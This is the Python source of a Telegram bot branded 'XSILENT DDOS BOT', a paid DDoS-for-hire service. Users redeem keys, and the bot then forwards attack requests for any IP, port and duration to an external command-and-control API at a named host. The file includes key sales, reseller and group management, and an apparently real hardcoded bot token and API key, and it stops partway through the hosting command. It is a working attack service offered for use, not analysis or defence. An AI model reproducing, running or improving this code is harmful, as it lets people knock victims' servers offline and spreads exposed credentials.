#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     ██╗  ██╗███████╗██╗██╗     ███████╗███╗   ██╗████████╗  ║
║     ╚██╗██╔╝██╔════╝██║██║     ██╔════╝████╗  ██║╚══██╔══╝  ║
║      ╚███╔╝ █████╗  ██║██║     █████╗  ██╔██╗ ██║   ██║     ║
║      ██╔██╗ ██╔══╝  ██║██║     ██╔══╝  ██║╚██╗██║   ██║     ║
║     ██╔╝ ██╗██║     ██║███████╗███████╗██║ ╚████║   ██║     ║
║     ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝     ║
║                                                              ║
║                 🔥 XSILENT DDOS BOT 🔥                      ║
║                   Premium Edition v3.0                      ║
╚══════════════════════════════════════════════════════════════╝
"""

import telebot
import requests
import time
import threading
import json
import os
import random
import string
import re
from datetime import datetime, timedelta, timezone
from collections import defaultdict
from pymongo import MongoClient
from dotenv import load_dotenv

load_dotenv()

# ═══════════════════════════════════════════════════════════════
# 📅 TIMEZONE CONFIG (IST - INDIA GMT+5:30)
# ═══════════════════════════════════════════════════════════════
IST = timezone(timedelta(hours=5, minutes=30))

def get_current_ist():
    return datetime.now(IST)

def format_ist_time(dt):
    return dt.strftime('📅 %d %b %Y ⏰ %I:%M:%S %p')

def format_ist_date(dt):
    return dt.strftime('📅 %d %b %Y ⏰ %I:%M %p')

# ═══════════════════════════════════════════════════════════════
# 🔧 CONFIGURATION (from .env file)
# ═══════════════════════════════════════════════════════════════
BOT_TOKEN = os.getenv("BOT_TOKEN", "8291785662:AAFecSvaKgCYWGzrtegGbB24EnAKWcshA2I")
ADMIN_IDS = os.getenv("ADMIN_IDS", "8487946379").split(",")
API_URL = os.getenv("API_URL", "http://cnc.teamc2.xyz:5001/api/attack")
API_KEY = os.getenv("API_KEY", "F6XMND")
MONGO_URI = os.getenv("MONGO_URI", "8291785662:AAFecSvaKgCYWGzrtegGbB24EnAKWcshA2I")
DATABASE_NAME = os.getenv("DATABASE_NAME", "xsilent_bot")

MAX_CONCURRENT = 2
COOLDOWN_TIME = 30
GLOBAL_MAX_ATTACK_TIME = 300

# ═══════════════════════════════════════════════════════════════
# 🗄️ MONGODB CONNECTION
# ═══════════════════════════════════════════════════════════════
try:
    client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
    client.admin.command('ping')
    db = client[DATABASE_NAME]
    print("✅ MongoDB Connected Successfully!")
    
    users_collection = db["users"]
    keys_collection = db["keys"]
    groups_collection = db["groups"]
    hosted_bots_collection = db["hosted_bots"]
    settings_collection = db["settings"]
    broadcast_users_collection = db["broadcast_users"]
    MONGO_ENABLED = True
except Exception as e:
    print(f"⚠️ MongoDB Error: {e}")
    print("⚠️ Using JSON file storage")
    MONGO_ENABLED = False
    DATA_DIR = "data"
    if not os.path.exists(DATA_DIR):
        os.makedirs(DATA_DIR)

print(f"📅 Server Time: {format_ist_time(get_current_ist())}")

# ═══════════════════════════════════════════════════════════════
# 📁 DATA STRUCTURES
# ═══════════════════════════════════════════════════════════════
active_attacks = {}
cooldown = {}
hosted_bots = {}
hosted_bot_instances = {}
maintenance_mode = False

# ═══════════════════════════════════════════════════════════════
# 💾 LOAD/SAVE FUNCTIONS (MongoDB + JSON Fallback)
# ═══════════════════════════════════════════════════════════════
def load_users():
    if MONGO_ENABLED:
        data = users_collection.find_one({"_id": "users"})
        if data:
            return data
    try:
        with open("data/users.json", "r") as f:
            return json.load(f)
    except:
        data = {"users": ADMIN_IDS, "resellers": []}
        save_users(data)
        return data

def save_users(data):
    if MONGO_ENABLED:
        users_collection.update_one({"_id": "users"}, {"$set": data}, upsert=True)
    else:
        with open("data/users.json", "w") as f:
            json.dump(data, f, indent=4)

def load_keys():
    keys = {}
    if MONGO_ENABLED:
        for doc in keys_collection.find():
            keys[doc["key"]] = {k: v for k, v in doc.items() if k != "_id"}
    try:
        with open("data/keys.json", "r") as f:
            keys.update(json.load(f))
    except:
        pass
    return keys

def save_keys(keys_data):
    if MONGO_ENABLED:
        keys_collection.delete_many({})
        for key, info in keys_data.items():
            info["key"] = key
            keys_collection.insert_one(info)
    with open("data/keys.json", "w") as f:
        json.dump(keys_data, f, indent=4)

def load_groups():
    groups = {}
    if MONGO_ENABLED:
        for doc in groups_collection.find():
            groups[doc["group_id"]] = {k: v for k, v in doc.items() if k != "_id"}
    try:
        with open("data/groups.json", "r") as f:
            groups.update(json.load(f))
    except:
        pass
    return groups

def save_groups(groups_data):
    if MONGO_ENABLED:
        groups_collection.delete_many({})
        for gid, info in groups_data.items():
            info["group_id"] = gid
            groups_collection.insert_one(info)
    with open("data/groups.json", "w") as f:
        json.dump(groups_data, f, indent=4)

def load_hosted_bots():
    bots = {}
    if MONGO_ENABLED:
        for doc in hosted_bots_collection.find():
            bots[doc["bot_token"]] = {k: v for k, v in doc.items() if k not in ["_id", "active_attacks"]}
            bots[doc["bot_token"]]["active_attacks"] = {}
    try:
        with open("data/hosted_bots.json", "r") as f:
            bots.update(json.load(f))
    except:
        pass
    return bots

def save_hosted_bots(bots_data):
    data_to_save = {}
    for token, info in bots_data.items():
        data_to_save[token] = {k: v for k, v in info.items() if k != "active_attacks"}
    if MONGO_ENABLED:
        hosted_bots_collection.delete_many({})
        for token, info in data_to_save.items():
            info["bot_token"] = token
            hosted_bots_collection.insert_one(info)
    with open("data/hosted_bots.json", "w") as f:
        json.dump(data_to_save, f, indent=4)

def load_settings():
    if MONGO_ENABLED:
        settings = settings_collection.find_one({"_id": "settings"})
        if settings:
            return settings
    try:
        with open("data/settings.json", "r") as f:
            return json.load(f)
    except:
        data = {"max_concurrent": 2, "cooldown": 30, "global_max_attack_time": 300}
        save_settings(data)
        return data

def save_settings(settings):
    if MONGO_ENABLED:
        settings_collection.update_one({"_id": "settings"}, {"$set": settings}, upsert=True)
    with open("data/settings.json", "w") as f:
        json.dump(settings, f, indent=4)

def load_broadcast_users():
    if MONGO_ENABLED:
        data = broadcast_users_collection.find_one({"_id": "broadcast_users"})
        if data:
            return data
    try:
        with open("data/broadcast_users.json", "r") as f:
            return json.load(f)
    except:
        data = {"users": []}
        save_broadcast_users(data)
        return data

def save_broadcast_users(data):
    if MONGO_ENABLED:
        broadcast_users_collection.update_one({"_id": "broadcast_users"}, {"$set": data}, upsert=True)
    with open("data/broadcast_users.json", "w") as f:
        json.dump(data, f, indent=4)

# ═══════════════════════════════════════════════════════════════
# 📊 LOAD INITIAL DATA
# ═══════════════════════════════════════════════════════════════
users_data = load_users()
users = users_data["users"]
resellers = users_data.get("resellers", [])
keys_data = load_keys()
groups = load_groups()
hosted_bots = load_hosted_bots()
settings = load_settings()
broadcast_data = load_broadcast_users()
broadcast_users = broadcast_data.get("users", [])

MAX_CONCURRENT = settings.get("max_concurrent", 2)
COOLDOWN_TIME = settings.get("cooldown", 30)
GLOBAL_MAX_ATTACK_TIME = settings.get("global_max_attack_time", 300)

bot = telebot.TeleBot(BOT_TOKEN)

# ═══════════════════════════════════════════════════════════════
# 🔧 HELPER FUNCTIONS
# ═══════════════════════════════════════════════════════════════
def check_maintenance():
    return maintenance_mode

def generate_key(prefix=""):
    suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    if prefix:
        return f"{prefix}-{suffix}"
    return f"KEY-{suffix}"

def parse_duration(duration_str):
    duration_str = duration_str.lower().strip()
    if duration_str.isdigit():
        return int(duration_str), "day"
    if duration_str.endswith('h'):
        hours = duration_str.replace('h', '')
        if hours.isdigit():
            return int(hours), "hour"
    return None, None

def get_expiry_date(value, unit):
    now_ist = get_current_ist()
    if unit == "hour":
        return now_ist + timedelta(hours=value)
    return now_ist + timedelta(days=value)

def format_duration(value, unit):
    if unit == "hour":
        return f"⏱️ {value} Hour(s)"
    return f"⏱️ {value} Day(s)"

def get_total_active_count():
    now = time.time()
    for aid in list(active_attacks.keys()):
        if now >= active_attacks[aid]["finish_time"]:
            del active_attacks[aid]
    for token, bot_info in hosted_bots.items():
        for aid in list(bot_info.get("active_attacks", {}).keys()):
            if now >= bot_info["active_attacks"][aid]["finish_time"]:
                del bot_info["active_attacks"][aid]
                save_hosted_bots(hosted_bots)
    return len(active_attacks) + sum(len(b.get("active_attacks", {})) for b in hosted_bots.values())

def check_user_expiry(user_id):
    now = time.time()
    for info in keys_data.values():
        if info.get("used_by") == user_id and info.get("used") and now < info["expires_at"]:
            return True
    return False

def validate_ip(ip):
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(pattern, ip):
        return all(0 <= int(p) <= 255 for p in ip.split('.'))
    return False

def validate_port(port):
    return 1 <= port <= 65535

def send_attack_to_api(ip, port, duration, chat_id, bot_instance, is_hosted=False):
    try:
        params = {"api_key": API_KEY, "target": ip, "port": port, "time": duration, "concurrent": 1}
        resp = requests.get(API_URL, params=params, timeout=10)
        if resp.status_code == 200:
            time.sleep(duration)
            finish_time = format_ist_time(get_current_ist())
            msg = f"""╔══════════════════════════════════════╗
║           ✅ ATTACK FINISHED ✅         ║
╠══════════════════════════════════════╣
║ 🎯 Target: {ip}:{port}
║ ⏱️ Duration: {duration}s
║ 📅 Finished: {finish_time}
╚══════════════════════════════════════╝"""
            bot_instance.send_message(chat_id, msg)
            return True
        else:
            bot_instance.send_message(chat_id, f"❌ Attack failed! Status: {resp.status_code}")
            return False
    except:
        bot_instance.send_message(chat_id, "❌ API error! Server may be down.")
        return False

# ═══════════════════════════════════════════════════════════════
# 🧹 CLEANUP THREADS
# ═══════════════════════════════════════════════════════════════
def cleanup_expired_keys():
    while True:
        time.sleep(60)
        now = time.time()
        expired = []
        for key, info in keys_data.items():
            if info.get("used") and now > info["expires_at"]:
                expired.append(key)
        for key in expired:
            user_id = keys_data[key].get("used_by")
            if user_id and user_id not in ADMIN_IDS:
                has_other = any(v.get("used_by") == user_id and v.get("used") and k != key and now < v["expires_at"] for k, v in keys_data.items())
                if not has_other and user_id in users:
                    users.remove(user_id)
                    users_data["users"] = users
                    save_users(users_data)
                    try:
                        bot.send_message(user_id, "⚠️ YOUR ACCESS HAS EXPIRED!\nContact admin to get a new key.")
                    except:
                        pass
            del keys_data[key]
        if expired:
            save_keys(keys_data)

threading.Thread(target=cleanup_expired_keys, daemon=True).start()

def attack_cleanup():
    while True:
        time.sleep(5)
        now = time.time()
        for aid in list(active_attacks.keys()):
            if now >= active_attacks[aid]["finish_time"]:
                del active_attacks[aid]
        for token, bot_info in hosted_bots.items():
            changed = False
            for aid in list(bot_info.get("active_attacks", {}).keys()):
                if now >= bot_info["active_attacks"][aid]["finish_time"]:
                    del bot_info["active_attacks"][aid]
                    changed = True
            if changed:
                save_hosted_bots(hosted_bots)

threading.Thread(target=attack_cleanup, daemon=True).start()

# ═══════════════════════════════════════════════════════════════
# 🤖 USER COMMANDS (Only these for users)
# ═══════════════════════════════════════════════════════════════

@bot.message_handler(commands=['start'])
def start_cmd(msg):
    uid = str(msg.chat.id)
    chat_type = msg.chat.type
    current_time = format_ist_time(get_current_ist())
    
    if uid not in broadcast_users:
        broadcast_users.append(uid)
        save_broadcast_users({"users": broadcast_users})
    
    if uid not in users and uid not in ADMIN_IDS:
        users.append(uid)
        users_data["users"] = users
        save_users(users_data)
    
    if check_maintenance():
        bot.reply_to(msg, "🔧 Bot is under maintenance!")
        return
    
    if chat_type in ["group", "supergroup"]:
        gid = str(msg.chat.id)
        if gid in groups:
            attack_time = groups[gid]["attack_time"]
            msg_text = f"""╔══════════════════════════════════════╗
║         ✨ GROUP BOT ACTIVE ✨        ║
╠══════════════════════════════════════╣
║ ✅ Group Approved!
║ ⚡ Max Attack Time: {attack_time}s
║ 📅 {current_time}
╠══════════════════════════════════════╣
║ 📝 COMMANDS:
║    /attack IP PORT
║    /status
║    /help
╚══════════════════════════════════════╝"""
            bot.reply_to(msg, msg_text)
        else:
            bot.reply_to(msg, "❌ Group not approved!\nContact: @XSILENT")
        return
    
    if uid in ADMIN_IDS:
        msg_text = f"""╔════════════════════════════════════════════════╗
║           👑 XSILENT OWNER PANEL 👑           ║
╠════════════════════════════════════════════════╣
║ ✅ Full Access Granted
║ ⚡ Global Concurrent: {MAX_CONCURRENT}
║ ⏳ Cooldown: {COOLDOWN_TIME}s
║ 🌍 Max Attack Time: 300s
║ 📅 {current_time}
╠════════════════════════════════════════════════╣
║ 📝 COMMANDS:
║    /attack IP PORT TIME
║    /status
║    /cooldown
║    /second <10-300>
║
║    /genkey 1 or 5h
║    /trialkey <prefix> <duration> <qty>
║    /removekey KEY
║
║    /add USER_ID
║    /remove USER_ID
║    /addreseller USER_ID
║    /removereseller USER_ID
║
║    /addgroup GROUP_ID SECONDS
║    /removegroup GROUP_ID
║    /allgroups
║
║    /host TOKEN OWNER_ID CONCURRENT NAME
║    /unhost TOKEN
║    /allhosts
║
║    /maintenance on/off
║    /broadcast
║    /stopattack IP:PORT
║    /allusers
║    /api_status
╚════════════════════════════════════════════════╝
🛒 Buy: @XSILENT"""
        bot.reply_to(msg, msg_text)
    
    elif uid in resellers:
        msg_text = f"""╔════════════════════════════════════════════════╗
║         💎 XSILENT RESELLER PANEL 💎         ║
╠════════════════════════════════════════════════╣
║ ✅ Reseller Access
║ ⚡ Global Concurrent: {MAX_CONCURRENT}
║ ⏳ Cooldown: {COOLDOWN_TIME}s
║ 📅 {current_time}
╠════════════════════════════════════════════════╣
║ 📝 COMMANDS:
║    /attack IP PORT TIME
║    /status
║    /cooldown
║    /genkey 1 or 5h
║    /mykeys
╚════════════════════════════════════════════════╝
🛒 Buy: @XSILENT"""
        bot.reply_to(msg, msg_text)
    
    elif uid in users:
        has_active = check_user_expiry(uid)
        status_text = "🟢 ACTIVE" if has_active else "🔴 EXPIRED"
        msg_text = f"""╔════════════════════════════════════════════════╗
║           🔥 XSILENT USER PANEL 🔥           ║
╠════════════════════════════════════════════════╣
║ ✅ Status: {status_text}
║ ⚡ Global Concurrent: {MAX_CONCURRENT}
║ ⏳ Cooldown: {COOLDOWN_TIME}s
║ 📅 {current_time}
╠════════════════════════════════════════════════╣
║ 📝 COMMANDS:
║    /attack IP PORT TIME
║    /redeem KEY
║    /status
║    /mykeys
║    /cooldown
║    /help
╚════════════════════════════════════════════════╝
🛒 Buy: @XSILENT"""
        bot.reply_to(msg, msg_text)
    
    else:
        bot.reply_to(msg, f"❌ Unauthorized!\nUse /redeem KEY to activate\n📅 {current_time}\n\n🛒 Buy: @XSILENT")

@bot.message_handler(commands=['help'])
def help_cmd(msg):
    uid = str(msg.chat.id)
    chat_type = msg.chat.type
    
    if chat_type in ["group", "supergroup"]:
        bot.reply_to(msg, "📝 Commands: /attack IP PORT, /status, /help")
        return
    
    if uid in ADMIN_IDS:
        bot.reply_to(msg, "👑 Owner Help:\n/attack, /status, /cooldown, /second, /genkey, /trialkey, /removekey, /add, /remove, /addreseller, /removereseller, /addgroup, /removegroup, /host, /unhost, /maintenance, /broadcast, /stopattack, /allusers, /allgroups, /allhosts, /api_status")
    elif uid in resellers:
        bot.reply_to(msg, "💎 Reseller Help:\n/attack, /status, /cooldown, /genkey, /mykeys")
    elif uid in users:
        bot.reply_to(msg, "🔥 User Help:\n/attack IP PORT TIME\n/redeem KEY\n/status\n/mykeys\n/cooldown")
    else:
        bot.reply_to(msg, "❌ Unauthorized. Use /redeem KEY to activate.")

@bot.message_handler(commands=['cooldown'])
def cooldown_cmd(msg):
    uid = str(msg.chat.id)
    if uid in cooldown:
        rem = COOLDOWN_TIME - (time.time() - cooldown[uid])
        if rem > 0:
            bot.reply_to(msg, f"⏳ Cooldown: {int(rem)} seconds remaining!")
            return
        del cooldown[uid]
    bot.reply_to(msg, "✅ No cooldown! You can attack now.")

@bot.message_handler(commands=['attack'])
def attack_cmd(msg):
    uid = str(msg.chat.id)
    chat_type = msg.chat.type
    is_group = chat_type in ["group", "supergroup"]
    
    if is_group:
        gid = str(msg.chat.id)
        if gid not in groups:
            bot.reply_to(msg, "❌ Group not approved!")
            return
        max_time = min(groups[gid]["attack_time"], 300)
        args = msg.text.split()
        if len(args) != 3:
            bot.reply_to(msg, "⚠️ Usage: /attack IP PORT")
            return
        ip, port = args[1], args[2]
        try:
            port = int(port)
            duration = max_time
        except:
            bot.reply_to(msg, "❌ Invalid port!")
            return
        if not validate_port(port):
            bot.reply_to(msg, f"❌ Invalid port! Port must be 1-65535. You entered: {port}")
            return
    else:
        if uid not in users or not check_user_expiry(uid):
            bot.reply_to(msg, "❌ No active key! Use /redeem KEY")
            return
        args = msg.text.split()
        if len(args) != 4:
            bot.reply_to(msg, "⚠️ Usage: /attack IP PORT TIME\nExample: /attack 1.1.1.1 443 60")
            return
        ip, port, dur = args[1], args[2], args[3]
        try:
            port = int(port)
            duration = int(dur)
        except:
            bot.reply_to(msg, "❌ Invalid port or time!")
            return
        if not validate_port(port):
            bot.reply_to(msg, f"❌ Invalid port! Port must be 1-65535. You entered: {port}")
            return
        if duration < 10:
            bot.reply_to(msg, "❌ Minimum 10 seconds!")
            return
        if duration > 300:
            bot.reply_to(msg, "❌ Maximum 300 seconds only!")
            return
        if uid in cooldown:
            rem = COOLDOWN_TIME - (time.time() - cooldown[uid])
            if rem > 0:
                bot.reply_to(msg, f"⏳ Wait {int(rem)} seconds!")
                return
    
    if not validate_ip(ip):
        bot.reply_to(msg, "❌ Invalid IP address!")
        return
    
    if get_total_active_count() >= MAX_CONCURRENT:
        bot.reply_to(msg, f"❌ Global limit {MAX_CONCURRENT} reached! Wait for an attack to finish.")
        return
    
    # Check if target already under attack
    target_key = f"{ip}:{port}"
    now = time.time()
    for attack in active_attacks.values():
        if attack["target_key"] == target_key and now < attack["finish_time"]:
            remaining = int(attack["finish_time"] - now)
            bot.reply_to(msg, f"❌ Target {ip}:{port} already under attack!\n⏰ Finishes in {remaining}s")
            return
    
    if not is_group:
        cooldown[uid] = time.time()
    
    attack_id = f"{uid}_{int(time.time())}_{random.randint(1000,9999)}"
    finish = time.time() + duration
    active_attacks[attack_id] = {"user": uid, "finish_time": finish, "ip": ip, "port": port, "target_key": target_key}
    
    response_msg = f"""╔══════════════════════════════════════╗
║         ✨ ATTACK LAUNCHED ✨          ║
╠══════════════════════════════════════╣
║ 🎯 Target: {ip}:{port}
║ ⏱️ Duration: {duration}s
║ 📅 Time: {format_ist_time(get_current_ist())}
║ 🌐 Global Active: {get_total_active_count()}/{MAX_CONCURRENT}
╚══════════════════════════════════════╝"""
    bot.reply_to(msg, response_msg)
    
    def run():
        send_attack_to_api(ip, port, duration, msg.chat.id, bot, False)
        if attack_id in active_attacks:
            del active_attacks[attack_id]
    threading.Thread(target=run).start()

@bot.message_handler(commands=['status'])
def status_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in users and uid not in ADMIN_IDS and uid not in resellers:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    now = time.time()
    slots = []
    for attack in active_attacks.values():
        if now < attack["finish_time"]:
            remaining = int(attack["finish_time"] - now)
            slots.append(f"🎯 {attack['target_key']} | 👤 {attack['user']} | ⏰ {remaining}s")
    
    status_text = "╔══════════════════════════════════════╗\n"
    status_text += "║         📊 ATTACK STATUS 📊          ║\n"
    status_text += "╠══════════════════════════════════════╣\n"
    
    if slots:
        for i, slot in enumerate(slots):
            status_text += f"║ 🔴 SLOT {i+1}: BUSY\n║    {slot}\n"
    else:
        status_text += "║ ✅ ALL SLOTS FREE\n║    No active attacks\n"
    
    status_text += f"╠══════════════════════════════════════╣\n"
    status_text += f"║ 📊 Main Active: {len(active_attacks)}/{MAX_CONCURRENT}\n"
    status_text += f"║ 🌐 Total Global: {get_total_active_count()}/{MAX_CONCURRENT}\n"
    status_text += f"║ 📅 {format_ist_time(get_current_ist())}\n"
    status_text += "╚══════════════════════════════════════╝"
    
    bot.reply_to(msg, status_text)

@bot.message_handler(commands=['redeem'])
def redeem_cmd(msg):
    uid = str(msg.chat.id)
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /redeem KEY")
        return
    
    key = args[1]
    if key not in keys_data:
        bot.reply_to(msg, "❌ Invalid key!")
        return
    
    info = keys_data[key]
    if info.get("used"):
        bot.reply_to(msg, "❌ Key already used!")
        return
    if time.time() > info["expires_at"]:
        bot.reply_to(msg, "❌ Key expired!")
        del keys_data[key]
        save_keys(keys_data)
        return
    
    if uid not in users:
        users.append(uid)
        users_data["users"] = users
        save_users(users_data)
    
    info["used"] = True
    info["used_at"] = time.time()
    info["used_by"] = uid
    save_keys(keys_data)
    
    expiry = datetime.fromtimestamp(info["expires_at"]).strftime('%d %b %Y, %I:%M %p')
    
    msg_text = f"""╔══════════════════════════════════════╗
║        ✅ ACCESS GRANTED ✅           ║
╠══════════════════════════════════════╣
║ 🎉 User: {uid}
║ ⏰ Duration: {format_duration(info['duration_value'], info['duration_unit'])}
║ 📅 Expires: {expiry}
║ ⚡ Max Concurrent: {MAX_CONCURRENT}
║ ⏳ Cooldown: {COOLDOWN_TIME}s
╚══════════════════════════════════════╝"""
    bot.reply_to(msg, msg_text)

@bot.message_handler(commands=['mykeys'])
def mykeys_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_IDS and uid not in resellers:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    my_keys = []
    for k, v in keys_data.items():
        if v.get("generated_by") == uid and not v.get("used"):
            exp = datetime.fromtimestamp(v["expires_at"]).strftime('%d %b %Y, %I:%M %p')
            my_keys.append(f"🔑 `{k}`\n   ⏰ {format_duration(v['duration_value'], v['duration_unit'])}\n   📅 {exp}")
    
    if my_keys:
        bot.reply_to(msg, "📋 YOUR GENERATED KEYS:\n\n" + "\n\n".join(my_keys), parse_mode='Markdown')
    else:
        bot.reply_to(msg, "📋 No unused keys found!")

# ═══════════════════════════════════════════════════════════════
# 👑 OWNER & RESELLER COMMANDS
# ═══════════════════════════════════════════════════════════════

@bot.message_handler(commands=['second'])
def second_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(msg, "❌ Owner only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /second <10-300>")
        return
    try:
        new_max = int(args[1])
        if new_max < 10 or new_max > 300:
            bot.reply_to(msg, "❌ Must be between 10-300 seconds!")
            return
        global GLOBAL_MAX_ATTACK_TIME
        GLOBAL_MAX_ATTACK_TIME = new_max
        settings["global_max_attack_time"] = new_max
        save_settings(settings)
        bot.reply_to(msg, f"✅ Global max attack time set to {new_max}s")
    except:
        bot.reply_to(msg, "❌ Invalid number!")

@bot.message_handler(commands=['genkey'])
def genkey_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_IDS and uid not in resellers:
        bot.reply_to(msg, "❌ Admin or reseller only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /genkey 1 or /genkey 5h")
        return
    val, unit = parse_duration(args[1])
    if not val:
        bot.reply_to(msg, "❌ Invalid! Use 1 or 5h")
        return
    key = generate_key()
    expires = get_expiry_date(val, unit)
    keys_data[key] = {"user_id": "pending", "duration_value": val, "duration_unit": unit, "generated_by": uid, "generated_at": time.time(), "expires_at": expires.timestamp(), "used": False}
    save_keys(keys_data)
    expiry_str = format_ist_date(expires)
    bot.reply_to(msg, f"""╔══════════════════════════════════════╗
║         ✅ KEY GENERATED ✅           ║
╠══════════════════════════════════════╣
║ 🔑 Key: `{key}`
║ ⏰ Duration: {format_duration(val, unit)}
║ 📅 Expires: {expiry_str}
╠══════════════════════════════════════╣
║ User: /redeem {key}
╚══════════════════════════════════════╝""", parse_mode='Markdown')

@bot.message_handler(commands=['trialkey'])
def trialkey_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(msg, "❌ Owner only!")
        return
    args = msg.text.split()
    if len(args) != 4:
        bot.reply_to(msg, "⚠️ Usage: /trialkey <prefix> <duration> <quantity>\nExample: /trialkey XSilent 1h 10")
        return
    prefix, dur_str, qty_str = args[1], args[2], args[3]
    val, unit = parse_duration(dur_str)
    if not val:
        bot.reply_to(msg, "❌ Invalid duration! Use 1 or 5h")
        return
    try:
        qty = int(qty_str)
        if qty < 1 or qty > 100:
            bot.reply_to(msg, "❌ Quantity must be 1-100")
            return
    except:
        bot.reply_to(msg, "❌ Invalid quantity!")
        return
    
    keys_list = []
    for _ in range(qty):
        key = generate_key(prefix)
        expires = get_expiry_date(val, unit)
        keys_data[key] = {"user_id": "pending", "duration_value": val, "duration_unit": unit, "generated_by": uid, "generated_at": time.time(), "expires_at": expires.timestamp(), "used": False}
        keys_list.append(key)
    save_keys(keys_data)
    
    expiry_str = format_ist_date(expires)
    bot.reply_to(msg, f"""╔══════════════════════════════════════╗
║       ✅ TRIAL KEYS GENERATED ✅      ║
╠══════════════════════════════════════╣
║ 🔑 Prefix: {prefix}
║ 📦 Quantity: {qty}
║ ⏰ Duration: {format_duration(val, unit)}
║ 📅 Expires: {expiry_str}
╠══════════════════════════════════════╣
║ KEYS:
║ {chr(10).join(['`' + k + '`' for k in keys_list])}
╚══════════════════════════════════════╝""", parse_mode='Markdown')

@bot.message_handler(commands=['removekey'])
def removekey_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(msg, "❌ Owner only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /removekey KEY")
        return
    key = args[1]
    if key in keys_data:
        del keys_data[key]
        save_keys(keys_data)
        bot.reply_to(msg, f"✅ Key `{key}` removed.", parse_mode='Markdown')
    else:
        bot.reply_to(msg, "❌ Key not found!")

@bot.message_handler(commands=['add'])
def add_user_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(msg, "❌ Owner only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /add USER_ID")
        return
    nu = args[1]
    if nu in ADMIN_IDS or nu in users:
        bot.reply_to(msg, "❌ User already exists or is owner!")
        return
    users.append(nu)
    users_data["users"] = users
    save_users(users_data)
    bot.reply_to(msg, f"✅ User {nu} added successfully!")

@bot.message_handler(commands=['remove'])
def remove_user_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(msg, "❌ Owner only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /remove USER_ID")
        return
    ru = args[1]
    if ru in ADMIN_IDS:
        bot.reply_to(msg, "❌ Cannot remove owner!")
        return
    if ru in users:
        users.remove(ru)
        users_data["users"] = users
        save_users(users_data)
        bot.reply_to(msg, f"✅ User {ru} removed!")
    else:
        bot.reply_to(msg, "❌ User not found!")

@bot.message_handler(commands=['addreseller'])
def add_reseller_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(msg, "❌ Owner only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /addreseller USER_ID")
        return
    rid = args[1]
    if rid in ADMIN_IDS or rid in resellers:
        bot.reply_to(msg, "❌ Already a reseller or owner!")
        return
    resellers.append(rid)
    if rid not in users:
        users.append(rid)
    users_data["users"] = users
    users_data["resellers"] = resellers
    save_users(users_data)
    bot.reply_to(msg, f"✅ Reseller {rid} added!")

@bot.message_handler(commands=['removereseller'])
def remove_reseller_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(msg, "❌ Owner only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /removereseller USER_ID")
        return
    rid = args[1]
    if rid in resellers:
        resellers.remove(rid)
        users_data["resellers"] = resellers
        save_users(users_data)
        bot.reply_to(msg, f"✅ Reseller {rid} removed!")
    else:
        bot.reply_to(msg, "❌ Not a reseller!")

@bot.message_handler(commands=['addgroup'])
def addgroup_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(msg, "❌ Owner only!")
        return
    args = msg.text.split()
    if len(args) != 3:
        bot.reply_to(msg, "⚠️ Usage: /addgroup GROUP_ID SECONDS\nExample: /addgroup -100123456789 60")
        return
    gid = args[1]
    try:
        sec = int(args[2])
        if sec < 10 or sec > 300:
            bot.reply_to(msg, "❌ Seconds must be 10-300!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid seconds!")
        return
    groups[gid] = {"attack_time": sec, "added_by": uid, "added_at": time.time()}
    save_groups(groups)
    bot.reply_to(msg, f"✅ Group {gid} added with max {sec}s attack time!")

@bot.message_handler(commands=['removegroup'])
def removegroup_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(msg, "❌ Owner only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /removegroup GROUP_ID")
        return
    gid = args[1]
    if gid in groups:
        del groups[gid]
        save_groups(groups)
        bot.reply_to(msg, f"✅ Group {gid} removed!")
    else:
        bot.reply_to(msg, "❌ Group not found!")

@bot.message_handler(commands=['allgroups'])
def allgroups_cmd(msg):
    if str(msg.chat.id) not in ADMIN_IDS:
        bot.reply_to(msg, "❌ Owner only!")
        return
    if not groups:
        bot.reply_to(msg, "📋 No groups added yet!")
        return
    txt = "📋 ALL GROUPS:\n\n"
    for gid, info in groups.items():
        txt += f"👥 {gid}\n   ⏱️ {info['attack_time']}s\n   👑 {info['added_by']}\n\n"
    bot.reply_to(msg, txt)

@bot.message_handler(commands=['host'])
def host_bot_cmd(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_IDS:
        bot.reply_to(msg, "❌ Owner only!")
        return
